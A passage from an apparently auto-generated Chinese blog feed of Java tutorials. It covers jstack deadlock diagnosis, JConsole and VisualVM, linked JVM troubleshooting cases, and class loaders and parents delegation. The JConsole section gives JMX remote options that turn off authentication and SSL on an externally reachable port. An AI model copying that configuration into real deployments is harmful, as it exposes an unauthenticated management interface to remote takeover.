class="number">0</span>x00000000d5efe1d0, a java.lang.Object),</span><br><span class="line">  which is held by <span class="string">"线程 2"</span></span><br><span class="line"></span><br><span class="line">Java stack information <span class="keyword">for</span> the threads listed above:</span><br><span class="line">===================================================</span><br><span class="line"><span class="string">"线程 2"</span>:</span><br><span class="line">        at DeadLockDemo.lambda<span class="variable">$main</span><span class="variable">$1</span>(DeadLockDemo.java:<span class="number">31</span>)</span><br><span class="line">        - waiting to lock &lt;<span class="number">0</span>x00000000d5efe1c0&gt; (a java.lang.Object)</span><br><span class="line">        - locked &lt;<span class="number">0</span>x00000000d5efe1d0&gt; (a java.lang.Object)</span><br><span class="line">        at DeadLockDemo<span class="variable">$</span><span class="variable">$Lambda</span><span class="variable">$2</span>/<span class="number">1078694789</span>.run(Unknown Source)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:<span class="number">748</span>)</span><br><span class="line"><span class="string">"线程 1"</span>:</span><br><span class="line">        at DeadLockDemo.lambda<span class="variable">$main</span><span class="variable">$0</span>(DeadLockDemo.java:<span class="number">16</span>)</span><br><span class="line">        - waiting to lock &lt;<span class="number">0</span>x00000000d5efe1d0&gt; (a java.lang.Object)</span><br><span class="line">        - locked &lt;<span class="number">0</span>x00000000d5efe1c0&gt; (a java.lang.Object)</span><br><span class="line">        at DeadLockDemo<span class="variable">$</span><span class="variable">$Lambda</span><span class="variable">$1</span>/<span class="number">1324119927</span>.run(Unknown Source)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:<span class="number">748</span>)</span><br><span class="line"></span><br><span class="line">Found <span class="number">1</span> deadlock.</span><br></pre></td></tr></tbody></table></figure><p>可以看到 <code>jstack</code> 命令已经帮我们找到发生死锁的线程的具体信息。</p><h2 id="JDK-可视化分析工具"><a href="#JDK-可视化分析工具" class="headerlink" title="JDK 可视化分析工具"></a>JDK 可视化分析工具</h2><h3 id="JConsole-Java-监视与管理控制台"><a href="#JConsole-Java-监视与管理控制台" class="headerlink" title="JConsole:Java 监视与管理控制台"></a>JConsole:Java 监视与管理控制台</h3><p>JConsole 是基于 JMX 的可视化监视、管理工具。可以很方便的监视本地及远程服务器的 java 进程的内存使用情况。你可以在控制台输出<code>console</code>命令启动或者在 JDK 目录下的 bin 目录找到<code>jconsole.exe</code>然后双击启动。</p><h4 id="连接-Jconsole"><a href="#连接-Jconsole" class="headerlink" title="连接 Jconsole"></a>连接 Jconsole</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/4058733264/1JConsole%E8%BF%9E%E6%8E%A5.png" alt="连接 Jconsole"></p><p>如果需要使用 JConsole 连接远程进程，可以在远程 Java 程序启动时加上下面这些参数:</p><figure class="highlight properties"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">-Djava.rmi.server.hostname</span>=<span class="string">外网访问 ip 地址</span></span><br><span class="line"><span class="attr">-Dcom.sun.management.jmxremote.port</span>=<span class="string">60001   //监控的端口号</span></span><br><span class="line"><span class="attr">-Dcom.sun.management.jmxremote.authenticate</span>=<span class="string">false   //关闭认证</span></span><br><span class="line"><span class="attr">-Dcom.sun.management.jmxremote.ssl</span>=<span class="string">false</span></span><br></pre></td></tr></tbody></table></figure><p>在使用 JConsole 连接时，远程进程地址如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">外网访问 ip 地址:60001</span><br></pre></td></tr></tbody></table></figure><h4 id="查看-Java-程序概况"><a href="#查看-Java-程序概况" class="headerlink" title="查看 Java 程序概况"></a>查看 Java 程序概况</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/4058733264/2%E6%9F%A5%E7%9C%8BJava%E7%A8%8B%E5%BA%8F%E6%A6%82%E5%86%B5.png" alt="查看 Java 程序概况 "></p><h4 id="内存监控"><a href="#内存监控" class="headerlink" title="内存监控"></a>内存监控</h4><p>JConsole 可以显示当前内存的详细信息。不仅包括堆内存/非堆内存的整体信息，还可以细化到 eden 区、survivor 区等的使用情况，如下图所示。</p><p>点击右边的“执行 GC(G)”按钮可以强制应用程序执行一个 Full GC。</p><blockquote><ul><li><strong>新生代 GC（Minor GC）</strong>:指发生新生代的的垃圾收集动作，Minor GC 非常频繁，回收速度一般也比较快。</li><li><strong>老年代 GC（Major GC/Full GC）</strong>:指发生在老年代的 GC，出现了 Major GC 经常会伴随至少一次的 Minor GC（并非绝对），Major GC 的速度一般会比 Minor GC 的慢 10 倍以上。</li></ul></blockquote><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/4058733264/3%E5%86%85%E5%AD%98%E7%9B%91%E6%8E%A7.png" alt="内存监控 "></p><h4 id="线程监控"><a href="#线程监控" class="headerlink" title="线程监控"></a>线程监控</h4><p>类似我们前面讲的 <code>jstack</code> 命令，不过这个是可视化的。</p><p>最下面有一个”检测死锁 (D)”按钮，点击这个按钮可以自动为你找到发生死锁的线程以及它们的详细信息 。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/4058733264/4%E7%BA%BF%E7%A8%8B%E7%9B%91%E6%8E%A7.png" alt="线程监控 "></p><h3 id="Visual-VM-多合一故障处理工具"><a href="#Visual-VM-多合一故障处理工具" class="headerlink" title="Visual VM:多合一故障处理工具"></a>Visual VM:多合一故障处理工具</h3><p>VisualVM 提供在 Java 虚拟机 (Java Virtual Machine, JVM) 上运行的 Java 应用程序的详细信息。在 VisualVM 的图形用户界面中，您可以方便、快捷地查看多个 Java 应用程序的相关信息。Visual VM 官网：<a href="https://visualvm.github.io/">https://visualvm.github.io/</a> 。Visual VM 中文文档:<a href="https://visualvm.github.io/documentation.html">https://visualvm.github.io/documentation.html</a>。</p><p>下面这段话摘自《深入理解 Java 虚拟机》。</p><blockquote><p>VisualVM（All-in-One Java Troubleshooting Tool）是到目前为止随 JDK 发布的功能最强大的运行监视和故障处理程序，官方在 VisualVM 的软件说明中写上了“All-in-One”的描述字样，预示着他除了运行监视、故障处理外，还提供了很多其他方面的功能，如性能分析（Profiling）。VisualVM 的性能分析功能甚至比起 JProfiler、YourKit 等专业且收费的 Profiling 工具都不会逊色多少，而且 VisualVM 还有一个很大的优点：不需要被监视的程序基于特殊 Agent 运行，因此他对应用程序的实际性能的影响很小，使得他可以直接应用在生产环境中。这个优点是 JProfiler、YourKit 等工具无法与之媲美的。</p></blockquote><p>VisualVM 基于 NetBeans 平台开发，因此他一开始就具备了插件扩展功能的特性，通过插件扩展支持，VisualVM 可以做到：</p><ul><li><strong>显示虚拟机进程以及进程的配置、环境信息（jps、jinfo）。</strong></li><li><strong>监视应用程序的 CPU、GC、堆、方法区以及线程的信息（jstat、jstack）。</strong></li><li><strong>dump 以及分析堆转储快照（jmap、jhat）。</strong></li><li><strong>方法级的程序运行性能分析，找到被调用最多、运行时间最长的方法。</strong></li><li><strong>离线程序快照：收集程序的运行时配置、线程 dump、内存 dump 等信息建立一个快照，可以将快照发送开发者处进行 Bug 反馈。</strong></li><li><strong>其他 plugins 的无限的可能性……</strong></li></ul><p>这里就不具体介绍 VisualVM 的使用，如果想了解的话可以看:</p><ul><li>javaguide: <a href="https://javaguide.cn/java/jvm/">https://javaguide.cn/java/jvm/</a></li><li><a href="https://visualvm.github.io/documentation.html">https://visualvm.github.io/documentation.html</a></li><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-visualvm/index.html">https://www.ibm.com/developerworks/cn/java/j-lo-visualvm/index.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM线上问题排查和性能调优案例</title>
      <link href="/posts/4053882931/"/>
      <url>/posts/4053882931/</url>
      
        <content type="html"><![CDATA[<p>JVM 线上问题排查和性能调优也是面试常问的一个问题，尤其是社招中大厂的面试。</p><p>这篇文章，我会分享一些我看到的相关的案例。</p><p>下面是正文。</p><p><a href="https://juejin.cn/post/7205141492264976445">一次线上 OOM 问题分析 - 艾小仙 - 2023</a></p><ul><li><strong>现象</strong>：线上某个服务有接口非常慢，通过监控链路查看发现，中间的 GAP 时间非常大，实际接口并没有消耗很多时间，并且在那段时间里有很多这样的请求。</li><li><strong>分析</strong>：使用 JDK 自带的<code>jvisualvm</code>分析 dump 文件(MAT 也能分析)。</li><li><strong>建议</strong>：对于 SQL 语句，如果监测到没有<code>where</code>条件的全表查询应该默认增加一个合适的<code>limit</code>作为限制，防止这种问题拖垮整个系统</li><li><strong>资料</strong>：<a href="https://heapdump.cn/article/3489050">实战案例：记一次 dump 文件分析历程转载 - HeapDump - 2022</a>。</li></ul><p><a href="https://www.cnblogs.com/mylibs/p/production-accident-0002.html">生产事故-记一次特殊的 OOM 排查 - 程语有云 - 2023</a></p><ul><li><strong>现象</strong>：网络没有问题的情况下，系统某开放接口从 2023 年 3 月 10 日 14 时许开始无法访问和使用。</li><li><strong>临时解决办法</strong>：紧急回滚至上一稳定版本。</li><li><strong>分析</strong>：使用 MAT (Memory Analyzer Tool)工具分析 dump 文件。</li><li><strong>建议</strong>：正常情况下，<code>-Xmn</code>参数（控制 Young 区的大小）总是应当小于<code>-Xmx</code>参数（控制堆内存的最大大小），否则就会触发 OOM 错误。</li><li><strong>资料</strong>：<a href="https://javaguide.cn/java/jvm/jvm-parameters-intro.html">最重要的 JVM 参数总结 - JavaGuide - 2023</a></li></ul><p><a href="https://juejin.cn/post/7078624931826794503">一次大量 JVM Native 内存泄露的排查分析（64M 问题） - 掘金 - 2022</a></p><ul><li><strong>现象</strong>：线上项目刚启动完使用 top 命令查看 RES 占用了超过 1.5G。</li><li><strong>分析</strong>：整个分析流程用到了较多工作，可以跟着作者思路一步一步来，值得学习借鉴。</li><li><strong>建议</strong>：远离 Hibernate。</li><li><strong>资料</strong>：<a href="https://liam.page/2020/07/17/memory-stat-in-TOP/">Linux top 命令里的内存相关字段（VIRT, RES, SHR, CODE, DATA）</a></li></ul><p><a href="https://www.heapdump.cn/article/1661497">YGC 问题排查，又让我涨姿势了！ - IT 人的职场进阶 - 2021</a></p><ul><li><strong>现象</strong>：广告服务在新版本上线后，收到了大量的服务超时告警。</li><li><strong>分析</strong>：使用 MAT (Memory Analyzer Tool) 工具分析 dump 文件。</li><li><strong>建议</strong>：学会 YGC（Young GC） 问题的排查思路，掌握 YGC 的相关知识点。</li></ul><p><a href="https://shuyi.tech/archives/have-a-try-in-jvm-combat">听说 JVM 性能优化很难？今天我小试了一把！ - 陈树义 - 2021</a></p><p>通过观察 GC 频率和停顿时间，来进行 JVM 内存空间调整，使其达到最合理的状态。调整过程记得小步快跑，避免内存剧烈波动影响线上服务。 这其实是最为简单的一种 JVM 性能调优方式了，可以算是粗调吧。</p><p><a href="https://mp.weixin.qq.com/s/df1uxHWUXzhErxW1sZ6OvQ">你们要的线上 GC 问题案例来啦 - 编了个程 - 2021</a></p><ul><li><strong>案例 1</strong>：使用 guava cache 的时候，没有设置最大缓存数量和弱引用，导致频繁触发 Young GC</li><li><strong>案例 2</strong>： 对于一个查询和排序分页的 SQL，同时这个 SQL 需要 join 多张表，在分库分表下，直接调用 SQL 性能很差。于是，查单表，再在内存排序分页，用了一个 List 来保存数据，而有些数据量大，造成了这个现象。</li></ul><p><a href="https://tech.meituan.com/2020/11/12/java-9-cms-gc.html">Java 中 9 种常见的 CMS GC 问题分析与解决 - 美团技术团 - 2020</a></p><p>这篇文章共 2w+ 字，详细介绍了 GC 基础，总结了 CMS GC 的一些常见问题分析与解决办法。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>javaguide: <a href="https://javaguide.cn/java/jvm/">https://javaguide.cn/java/jvm/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类加载器详解</title>
      <link href="/posts/3182538063/"/>
      <url>/posts/3182538063/</url>
      
        <content type="html"><![CDATA[<h2 id="回顾一下类加载过程"><a href="#回顾一下类加载过程" class="headerlink" title="回顾一下类加载过程"></a>回顾一下类加载过程</h2><p>开始介绍类加载器和双亲委派模型之前，简单回顾一下类加载过程。</p><ul><li>类加载过程：<strong>加载-&gt;连接-&gt;初始化</strong>。</li><li>连接过程又可分为三步：<strong>验证-&gt;准备-&gt;解析</strong>。</li></ul><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3182538063/class-loading-procedure-20230614221433913.png" alt="类加载过程"></p><p>加载是类加载过程的第一步，主要完成下面 3 件事情：</p><ol><li>通过全类名获取定义此类的二进制字节流</li><li>将字节流所代表的静态存储结构转换为方法区的运行时数据结构</li><li>在内存中生成一个代表该类的 <code>Class</code> 对象，作为方法区这些数据的访问入口</li></ol><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><h3 id="类加载器介绍"><a href="#类加载器介绍" class="headerlink" title="类加载器介绍"></a>类加载器介绍</h3><p>类加载器从 JDK 1.0 就出现了，最初只是为了满足 Java Applet（已经被淘汰） 的需要。后来，慢慢成为 Java 程序中的一个重要组成部分，赋予了 Java 类可以被动态加载到 JVM 中并执行的能力。</p><p>根据官方 API 文档的介绍：</p><blockquote><p>A class loader is an object that is responsible for loading classes. The class ClassLoader is an abstract class. Given the binary name of a class, a class loader should attempt to locate or generate data that constitutes a definition for the class. A typical strategy is to transform the name into a file name and then read a “class file” of that name from a file system.</p><p>Every Class object contains a reference to the ClassLoader that defined it.</p><p>Class objects for array classes are not created by class loaders, but are created automatically as required by the Java runtime. The class loader for an array class, as returned by Class.getClassLoader() is the same as the class loader for its element type; if the element type is a primitive type, then the array class has no class loader.</p></blockquote><p>翻译过来大概的意思是：</p><blockquote><p>类加载器是一个负责加载类的对象。<code>ClassLoader</code> 是一个抽象类。给定类的二进制名称，类加载器应尝试定位或生成构成类定义的数据。典型的策略是将名称转换为文件名，然后从文件系统中读取该名称的“类文件”。</p><p>每个 Java 类都有一个引用指向加载它的 <code>ClassLoader</code>。不过，数组类不是通过 <code>ClassLoader</code> 创建的，而是 JVM 在需要的时候自动创建的，数组类通过<code>getClassLoader()</code>方法获取 <code>ClassLoader</code> 的时候和该数组的元素类型的 <code>ClassLoader</code> 是一致的。</p></blockquote><p>从上面的介绍可以看出:</p><ul><li>类加载器是一个负责加载类的对象，用于实现类加载过程中的加载这一步。</li><li>每个 Java 类都有一个引用指向加载它的 <code>ClassLoader</code>。</li><li>数组类不是通过 <code>ClassLoader</code> 创建的（数组类没有对应的二进制字节流），是由 JVM 直接生成的。</li></ul><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Class</span>&lt;T&gt; {</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader classLoader;</span><br><span class="line">  <span class="meta">@CallerSensitive</span></span><br><span class="line">  <span class="keyword">public</span> ClassLoader <span class="title function_">getClassLoader</span><span class="params">()</span> {</span><br><span class="line">     <span class="comment">//...</span></span><br><span class="line">  }</span><br><span class="line">  ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>简单来说，<strong>类加载器的主要作用就是加载 Java 类的字节码（ <code>.class</code> 文件）到 JVM 中（在内存中生成一个代表该类的 <code>Class</code> 对象）。</strong> 字节码可以是 Java 源程序（<code>.java</code>文件）经过 <code>javac</code> 编译得来，也可以是通过工具动态生成或者通过网络下载得来。</p><p>其实除了加载类之外，类加载器还可以加载 Java 应用所需的资源如文本、图像、配置文件、视频等等文件资源。本文只讨论其核心功能：加载类。</p><h3 id="类加载器加载规则"><a href="#类加载器加载规则" class="headerlink" title="类加载器加载规则"></a>类加载器加载规则</h3><p>JVM 启动的时候，并不会一次性加载所有的类，而是根据需要去动态加载。也就是说，大部分类在具体用到的时候才会去加载，这样对内存更加友好。</p><p>对于已经加载的类会被放在 <code>ClassLoader</code> 中。在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载。也就是说，对于一个类加载器来说，相同二进制名称的类只会被加载一次。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> {</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line">  <span class="comment">// 由这个类加载器加载的类。</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> Vector&lt;Class&lt;?&gt;&gt; classes = <span class="keyword">new</span> <span class="title class_">Vector</span>&lt;&gt;();</span><br><span class="line">  <span class="comment">// 由VM调用，用此类加载器记录每个已加载类。</span></span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">addClass</span><span class="params">(Class&lt;?&gt; c)</span> {</span><br><span class="line">        classes.addElement(c);</span><br><span class="line">   }</span><br><span class="line">  ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="类加载器总结"><a href="#类加载器总结" class="headerlink" title="类加载器总结"></a>类加载器总结</h3><p>JVM 中内置了三个重要的 <code>ClassLoader</code>：</p><ol><li> **<code>BootstrapClassLoader</code>(启动类加载器)**：最顶层的加载类，由 C++实现，通常表示为 null，并且没有父级，主要用来加载 JDK 内部的核心类库（ <code>%JAVA_HOME%/lib</code>目录下的 <code>rt.jar</code>、<code>resources.jar</code>、<code>charsets.jar</code>等 jar 包和类）以及被 <code>-Xbootclasspath</code>参数指定的路径下的所有类。</li><li> **<code>ExtensionClassLoader</code>(扩展类加载器)**：主要负责加载 <code>%JRE_HOME%/lib/ext</code> 目录下的 jar 包和类以及被 <code>java.ext.dirs</code> 系统变量所指定的路径下的所有类。</li><li> **<code>AppClassLoader</code>(应用程序类加载器)**：面向我们用户的加载器，负责加载当前应用 classpath 下的所有 jar 包和类。</li></ol><blockquote><p>🌈 拓展一下：</p><ul><li>**<code>rt.jar</code>**：rt 代表“RunTime”，<code>rt.jar</code>是 Java 基础类库，包含 Java doc 里面看到的所有的类的类文件。也就是说，我们常用内置库 <code>java.xxx.* </code>都在里面，比如<code>java.util.*</code>、<code>java.io.*</code>、<code>java.nio.*</code>、<code>java.lang.*</code>、<code>java.sql.*</code>、<code>java.math.*</code>。</li><li>Java 9 引入了模块系统，并且略微更改了上述的类加载器。扩展类加载器被改名为平台类加载器（platform class loader）。Java SE 中除了少数几个关键模块，比如说 <code>java.base</code> 是由启动类加载器加载之外，其他的模块均由平台类加载器所加载。</li></ul></blockquote><p>除了这三种类加载器之外，用户还可以加入自定义的类加载器来进行拓展，以满足自己的特殊需求。就比如说，我们可以对 Java 类的字节码（ <code>.class</code> 文件）进行加密，加载时再利用自定义的类加载器对其解密。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3182538063/class-loader-parents-delegation-model.png" alt="类加载器层次关系图"></p><p>除了 <code>BootstrapClassLoader</code> 是 JVM 自身的一部分之外，其他所有的类加载器都是在 JVM 外部实现的，并且全都继承自 <code>ClassLoader</code>抽象类。这样做的好处是用户可以自定义类加载器，以便让应用程序自己决定如何去获取所需的类。</p><p>每个 <code>ClassLoader</code> 可以通过<code>getParent()</code>获取其父 <code>ClassLoader</code>，如果获取到 <code>ClassLoader</code> 为<code>null</code>的话，那么该类是通过 <code>BootstrapClassLoader</code> 加载的。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> {</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 父加载器</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line">  <span class="meta">@CallerSensitive</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">final</span> ClassLoader <span class="title function_">getParent</span><span class="params">()</span> {</span><br><span class="line">     <span class="comment">//...</span></span><br><span class="line">  }</span><br><span class="line">  ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>为什么 获取到 <code>ClassLoader</code> 为<code>null</code>就是 <code>BootstrapClassLoader</code> 加载的呢？</strong> 这是因为<code>BootstrapClassLoader</code> 由 C++ 实现，由于这个 C++ 实现的类加载器在 Java 中是没有与之对应的类的，所以拿到的结果是 null。</p><p>下面我们来看一个获取 <code>ClassLoader</code> 的小案例：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrintClassLoaderTree</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> PrintClassLoaderTree.class.getClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">split</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">"|--"</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">needContinue</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (needContinue){</span><br><span class="line">            System.out.println(split.toString() + classLoader);</span><br><span class="line">            <span class="keyword">if</span>(classLoader == <span class="literal">null</span>){</span><br><span class="line">                needContinue = <span class="literal">false</span>;</span><br><span class="line">            }<span class="keyword">else</span>{</span><br><span class="line">                classLoader = classLoader.getParent();</span><br><span class="line">                split.insert(<span class="number">0</span>, <span class="string">"\t"</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出结果(JDK 8 )：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|--sun.misc.Launcher$AppClassLoader@18b4aac2</span><br><span class="line">    |--sun.misc.Launcher$ExtClassLoader@53bd815b</span><br><span class="line">        |--null</span><br></pre></td></tr></tbody></table></figure><p>从输出结果可以看出：</p><ul><li>我们编写的 Java 类 <code>PrintClassLoaderTree</code> 的 <code>ClassLoader</code> 是<code>AppClassLoader</code>；</li><li><code>AppClassLoader</code>的父 <code>ClassLoader</code> 是<code>ExtClassLoader</code>；</li><li><code>ExtClassLoader</code>的父<code>ClassLoader</code>是<code>Bootstrap ClassLoader</code>，因此输出结果为 null。</li></ul><h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p>我们前面也说说了，除了 <code>BootstrapClassLoader</code> 其他类加载器均由 Java 实现且全部继承自<code>java.lang.ClassLoader</code>。如果我们要自定义自己的类加载器，很明显需要继承 <code>ClassLoader</code>抽象类。</p><p><code>ClassLoader</code> 类有两个关键的方法：</p><ul><li><code>protected Class loadClass(String name, boolean resolve)</code>：加载指定二进制名称的类，实现了双亲委派机制 。<code>name</code> 为类的二进制名称，<code>resove</code> 如果为 true，在加载时调用 <code>resolveClass(Class&lt;?&gt; c)</code> 方法解析该类。</li><li><code>protected Class findClass(String name)</code>：根据类的二进制名称来查找类，默认实现是空方法。</li></ul><p>官方 API 文档中写到：</p><blockquote><p>Subclasses of <code>ClassLoader</code> are encouraged to override <code>findClass(String name)</code>, rather than this method.</p><p>建议 <code>ClassLoader</code>的子类重写 <code>findClass(String name)</code>方法而不是<code>loadClass(String name, boolean resolve)</code> 方法。</p></blockquote><p>如果我们不想打破双亲委派模型，就重写 <code>ClassLoader</code> 类中的 <code>findClass()</code> 方法即可，无法被父类加载器加载的类最终会通过这个方法被加载。但是，如果想打破双亲委派模型则需要重写 <code>loadClass()</code> 方法。</p><h2 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h2><h3 id="双亲委派模型介绍"><a href="#双亲委派模型介绍" class="headerlink" title="双亲委派模型介绍"></a>双亲委派模型介绍</h3><p>类加载器有很多种，当我们想要加载一个类的时候，具体是哪个类加载器加载呢？这就需要提到双亲委派模型了。</p><p>根据官网介绍：</p><blockquote><p>The ClassLoader class uses a delegation model to search for classes and resources. Each instance of ClassLoader has an associated parent class loader. When requested to find a class or resource, a ClassLoader instance will delegate the search for the class or resource to its parent class loader before attempting to find the class or resource itself. The virtual machine’s built-in class loader, called the “bootstrap class loader”, does not itself have a parent but may serve as the parent of a ClassLoader instance.</p></blockquote><p>翻译过来大概的意思是：</p><blockquote><p><code>ClassLoader</code> 类使用委托模型来搜索类和资源。每个 <code>ClassLoader</code> 实例都有一个相关的父类加载器。需要查找类或资源时，<code>ClassLoader</code> 实例会在试图亲自查找类或资源之前，将搜索类或资源的任务委托给其父类加载器。<br>虚拟机中被称为 “bootstrap class loader”的内置类加载器本身没有父类加载器，但是可以作为 <code>ClassLoader</code> 实例的父类加载器。</p></blockquote><p>从上面的介绍可以看出：</p><ul><li><code>ClassLoader</code> 类使用委托模型来搜索类和资源。</li><li>双亲委派模型要求除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器。</li><li><code>ClassLoader</code> 实例会在试图亲自查找类或资源之前，将搜索类或资源的任务委托给其父类加载器。</li></ul><p>下图展示的各种类加载器之间的层次关系被称为类加载器的“**双亲委派模型(Parents Delegation Model)**”。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/3182538063/class-loader-parents-delegation-model.png" alt="类加载器层次关系图"></p><p>注意 ⚠️：双亲委派模型并不是一种强制性的约束，只是 JDK 官方推荐的一种方式。如果我们因为某些特殊需求想要打破双亲委派模型，也是可以的，后文会介绍具体的方法。</p><p>其实这个双亲翻译的容易让别人误解，我们一般理解的双亲都是父母，这里的双亲更多地表达的是“父母这一辈”的人而已，并不是说真的有一个 <code>MotherClassLoader</code> 和一个<code>FatherClassLoader</code> 。个人觉得翻译成单亲委派模型更好一些，不过，国内既然翻译成了双亲委派模型并流传了，按照这个来也没问题，不要被误解了就好。</p><p>另外，类加载器之间的父子关系一般不是以继承的关系来实现的，而是通常使用组合关系来复用父加载器的代码。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> {</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 组合</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line">  <span class="keyword">protected</span> <span class="title function_">ClassLoader</span><span class="params">(ClassLoader parent)</span> {</span><br><span class="line">       <span class="built_in">this</span>(checkCreateClassLoader(), parent);</span><br><span class="line">  }</span><br><span class="line">  ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在面向对象编程中，有一条非常经典的设计原则：<strong>组合优于继承，多用组合少用继承。</strong></p><h3 id="双亲委派模型的执行流程"><a href="#双亲委派模型的执行流程" class="headerlink" title="双亲委派模型的执行流程"></a>双亲委派模型的执行流程</h3><p>双亲委派模型的实现代码非常简单，逻辑非常清晰，都集中在 <code>java.lang.ClassLoader</code> 的 <code>loadClass()</code> 中，相关代码如下所示。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 